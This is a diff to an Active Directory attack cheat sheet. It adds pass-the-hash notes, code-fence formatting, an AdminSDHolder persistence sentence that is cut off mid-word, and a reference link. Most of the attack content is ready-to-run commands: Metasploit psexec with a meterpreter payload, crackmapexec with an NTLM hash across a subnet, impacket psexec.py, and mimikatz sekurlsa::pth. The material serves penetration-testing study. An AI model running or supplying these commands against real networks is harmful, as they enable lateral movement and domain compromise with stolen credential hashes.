@@ -524,7 +524,7 @@ v1.3.4
 
 ### Pass-the-Hash
 
-The types of hashes you can use with Pass-The-Hash are NT or NTLM hashes.
+The types of hashes you can use with Pass-The-Hash are NT or NTLM hashes. Since Windows Vista, attackers have been unable to pass-the-hash to local admin accounts that weren’t the built-in RID 500.
 
 ```powershell
 use exploit/windows/smb/psexec
@@ -536,15 +536,23 @@ set SMBPass nastyCutt3r
 set PAYLOAD windows/meterpreter/bind_tcp
 run
 shell
+```
 
 or with crackmapexec
+
+```powershell
 cme smb 10.2.0.2 -u jarrieta -H 'aad3b435b51404eeaad3b435b51404ee:489a04c09a5debbc9b975356693e179d' -x "whoami"
 also works with net range : cme smb 10.2.0.2/24 ... 
+```
 
 or with psexec
+
+```powershell
 proxychains python ./psexec.py jarrieta@10.2.0.2 -hashes :489a04c09a5debbc9b975356693e179d
+```
 
 or with the builtin Windows RDP and mimikatz
+```powershell
 sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the user's ntlm hash> /run:"mstsc.exe /restrictedadmin"
 ```
 
@@ -590,6 +598,8 @@ If a machine has `SMB signing`:`disabled`, it is possible to use Responder with 
 4. Wait for a shell
 
 ### Dangerous Built-in Groups Usage
+
+If you do not want modified ACLs to be overwrite every hour, you should change ACL template on the object CN=AdminSDHolder,CN=System, " or set "adminCount" attribute to 0 for the required objec
 
 AdminSDHolder
 
@@ -927,3 +937,4 @@ PXE allows a workstation to boot from the network by retrieving an operating sys
 * [WONKACHALL AKERVA NDH2018 – WRITE UP PART 5](https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-5/)
 * [Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory - 28 January 2019 - Elad Shami](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
 * [[PrivExchange] From user to domain admin in less than 60sec ! - davy](http://blog.randorisec.fr/privexchange-from-user-to-domain-admin-in-less-than-60sec/)
+* [Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy - March 16, 2017 - harmj0y](http://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/)
